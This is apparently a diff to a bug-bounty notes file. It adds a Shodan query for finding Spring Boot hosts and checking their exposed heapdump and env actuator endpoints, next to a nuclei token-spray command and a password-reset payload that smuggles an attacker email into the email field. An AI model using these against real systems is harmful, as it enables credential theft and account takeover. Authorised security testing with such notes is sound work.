@@ -129,6 +129,21 @@ after gathering tokens use  ( token-spray ) template
 nuclei -t nuclei-templates/token-spray -var token=goanmginaonim
 or can use file of tokens in token=token_file
 
+
+
+• Shodan Query for springboot : 
+
+http.favicon.hash:116323821  ssl:"domain name"
+
+then if found check for 
+
+/heapdump 
+/env 
+/actuator/heapdump
+/actuator/env
+
+
+
 -----------------------------------------------------------------------------------------------------------
                                             password reset 
                                             {"email":"victim@gmail.com\nattacker@gmail.com"}
